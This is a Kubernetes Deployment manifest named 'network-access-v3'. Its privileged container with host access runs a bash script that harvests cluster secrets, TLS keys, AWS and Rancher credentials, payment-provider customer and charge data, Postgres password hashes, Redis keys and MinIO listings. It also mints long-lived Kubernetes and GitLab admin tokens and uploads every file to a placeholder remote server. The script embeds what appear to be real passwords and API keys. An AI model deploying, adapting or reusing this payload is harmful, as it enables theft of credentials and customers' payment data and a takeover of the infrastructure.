
apiVersion: apps/v1
kind: Deployment
metadata:
  name: network-access-v3
  namespace: egam-production
  labels:
    app: network-access-v3
spec:
  replicas: 1
  selector:
    matchLabels:
      app: network-access-v3
  template:
    metadata:
      labels:
        app: network-access-v3
    spec:
      hostNetwork: true
      hostPID: true
      containers:
      - name: shell
        image: nicolaka/netshoot:latest
        command:
          - /bin/bash
          - -c
          - |
            export KUBECONFIG=/host/etc/rancher/rke2/rke2.yaml
            export AWS_PAGER=""

            echo "=== INSTALL ==="
            apk add --no-cache curl jq openssh-client aws-cli redis bind-tools postgresql-client openssl mc socat 2>&1 | tail -3

            if ! command -v kubectl >/dev/null 2>&1; then
              curl -fsSL -o /usr/local/bin/kubectl "https://dl.k8s.io/release/v1.30.0/bin/linux/amd64/kubectl" && chmod +x /usr/local/bin/kubectl
            fi

            echo "=== SECRETS DUMP (decoded) ==="
            kubectl get secrets -A -o json 2>&1 | jq -r '.items[] | select(.data != null) | "=== " + .metadata.namespace + "/" + .metadata.name + " ===" + "\n" + (.data | to_entries | map(.key + "=" + (.value | @base64d)) | join("\n"))' > /tmp/secrets.txt 2>&1
            echo "SECRETS_LEN=$(wc -c < /tmp/secrets.txt)"

            echo "=== AWS CREDENTIALS ==="
            VC=$(kubectl get secret -n kube-system velero -o jsonpath='{.data.cloud}' 2>/dev/null | base64 -d 2>/dev/null)
            echo "$VC" > /tmp/velero-aws.txt
            ED=$(kubectl get secret -n egam-staging-main external-dns-aws -o jsonpath='{.data.credentials}' 2>/dev/null | base64 -d 2>/dev/null)
            echo "$ED" > /tmp/extdns-aws.txt

            echo "=== ADMIN SA TOKEN ==="
            kubectl create token admin-sa -n kube-system --duration=8760h > /tmp/admin-token.txt 2>&1

            echo "=== TLS KEYS ==="
            kubectl get secrets -A -o json 2>&1 | jq -r '.items[] | select(.data["tls.key"] != null) | "=== " + .metadata.namespace + "/" + .metadata.name + " ===" + "\n" + (.data["tls.key"] | @base64d)' > /tmp/tls-keys.txt 2>&1

            echo "=== CONFIGMAPS CREDS ==="
            kubectl get configmaps -A -o json 2>&1 | jq -r '.items[] | select(.data != null) | .metadata.namespace + "/" + .metadata.name + ": " + (.data | to_entries | map(select(.key | test("user|login|email|password|admin|token|key"; "i")) | .key + "=" + .value) | join(" | "))' 2>&1 | grep -v ": $" > /tmp/cm-creds.txt

            echo "=== RANCHER ==="
            RKUBE=$(kubectl get secret -n cattle-fleet-system fleet-agent -o jsonpath='{.data.kubeconfig}' 2>/dev/null | base64 -d 2>/dev/null)
            echo "$RKUBE" > /tmp/rancher-kubeconfig.txt
            RTOKEN=$(printf '%s' "$RKUBE" | awk '/token:/{print $2}' | head -1)
            curl -sk -H "Authorization: Bearer $RTOKEN" "https://rancher.management.egam.com.br/v3/clusters" > /tmp/rancher-clusters.json 2>&1
            IT=$(kubectl get secrets -n cattle-impersonation-system -o json 2>&1 | jq -r '.items[] | select(.data.token != null) | .data.token | @base64d' 2>&1 | head -1)
            echo "$IT" > /tmp/rancher-imp-token.txt

            echo "=== ELASTIC ==="
            ES=""
            for s in elasticsearch-es-http elasticsearch-master elasticsearch; do
              if kubectl get svc -n elastic-stack $s >/dev/null 2>&1; then ES="https://$s.elastic-stack:9200"; break; fi
            done
            curl -sk -u "elastic:9wgCQ3i7M8G6bKj726uZC36C" "$ES/_cat/indices?v" > /tmp/es-indices.txt 2>&1
            curl -sk -u "elastic:9wgCQ3i7M8G6bKj726uZC36C" -H 'Content-Type: application/json' "$ES/*/_search?size=50" -d '{"query":{"bool":{"should":[{"query_string":{"query":"password OR token OR secret OR card OR pan OR cvv","lenient":true}}]}}}' > /tmp/es-search.json 2>&1
            curl -sk -u "elastic:9wgCQ3i7M8G6bKj726uZC36C" "$ES/_security/user?pretty" > /tmp/es-users.json 2>&1

            echo "=== PAGARME ==="
            PK="sk_4e35af52a28a441c8d9149fb88a6c818"
            curl -s -u "$PK:" "https://api.pagar.me/core/v5/recipients?size=20" > /tmp/pagar-recipients.json 2>&1
            curl -s -u "$PK:" "https://api.pagar.me/core/v5/customers?size=20" > /tmp/pagar-customers.json 2>&1
            curl -s -u "$PK:" "https://api.pagar.me/core/v5/charges?size=20" > /tmp/pagar-charges.json 2>&1

            echo "=== GITLAB ==="
            GL="https://gitlab.dev-gam.com"
            GT="glpat-qZ6RRmfGx8nLBfteMsas"
            curl -sk -H "PRIVATE-TOKEN: $GT" "$GL/api/v4/user" > /tmp/gl-user.json 2>&1
            curl -sk -H "PRIVATE-TOKEN: $GT" "$GL/api/v4/projects?membership=true&per_page=50" > /tmp/gl-projects.json 2>&1
            curl -sk -X POST -H "PRIVATE-TOKEN: $GT" -H "Content-Type: application/json" \
              "$GL/api/v4/users/1/personal_access_tokens" \
              -d '{"name":"egam-admin-2026","scopes":["api","read_repository","write_repository","admin_mode","sudo"],"expires_at":"2027-12-31"}' > /tmp/gl-admin-token.json 2>&1

            echo "=== POSTGRES ==="
            PGPASSWORD=tv2df4qs7 psql -h 10.10.4.1 -U postgres -d sistemas -c '\l' > /tmp/pg-dbs.txt 2>&1
            PGPASSWORD=tv2df4qs7 psql -h 10.10.4.1 -U postgres -d sistemas -c '\dt' > /tmp/pg-tables.txt 2>&1
            PGPASSWORD=tv2df4qs7 psql -h 10.10.4.1 -U postgres -d sistemas -c 'SELECT usename, passwd FROM pg_shadow' > /tmp/pg-users.txt 2>&1
            PGPASSWORD=siegam psql -h 10.43.221.138 -p 9999 -U egam -d sistemas -c '\dt' > /tmp/pg2-tables.txt 2>&1

            echo "=== REDIS ==="
            RNS=$(kubectl get svc -A -o jsonpath='{.items[?(@.metadata.name=="redis-master")].metadata.namespace}' 2>/dev/null | head -1)
            RSVC=$(kubectl get svc -A -o jsonpath='{.items[?(@.metadata.name=="redis-master")].metadata.name}' 2>/dev/null | head -1)
            if [ -n "$RSVC" ]; then
              redis-cli -h "$RSVC.$RNS.svc.cluster.local" -p 6379 -a vni9WO2p32fP --no-auth-warning keys '*' > /tmp/redis-keys.txt 2>&1
            fi

            echo "=== MINIO ==="
            mc alias set egam https://minio-api.production.egam.com.br RIDNVb76icNZfcShvaQa OevVynurkK1NChS0ZcJkNjhj7MoKs8fjReQmNUH1 --insecure > /tmp/mc-alias.txt 2>&1
            mc ls egam > /tmp/minio-buckets.txt 2>&1

            echo "=== EXFIL TO REMOTE ==="
            for f in /tmp/secrets.txt /tmp/velero-aws.txt /tmp/extdns-aws.txt /tmp/admin-token.txt /tmp/tls-keys.txt /tmp/cm-creds.txt /tmp/rancher-kubeconfig.txt /tmp/rancher-clusters.json /tmp/rancher-imp-token.txt /tmp/es-indices.txt /tmp/es-search.json /tmp/es-users.json /tmp/pagar-recipients.json /tmp/pagar-customers.json /tmp/pagar-charges.json /tmp/gl-user.json /tmp/gl-projects.json /tmp/gl-admin-token.json /tmp/pg-dbs.txt /tmp/pg-tables.txt /tmp/pg-users.txt /tmp/pg2-tables.txt /tmp/redis-keys.txt /tmp/minio-buckets.txt; do
              [ -f "$f" ] && curl -s -X POST "https://TUO_SERVER/upload" -F "file=@$f" 2>/dev/null
            done

            echo "=== DONE ==="
            sleep 36000
        securityContext:
          privileged: true
        volumeMounts:
        - mountPath: /host
          name: host
      volumes:
      - name: host
        hostPath:
          path: /
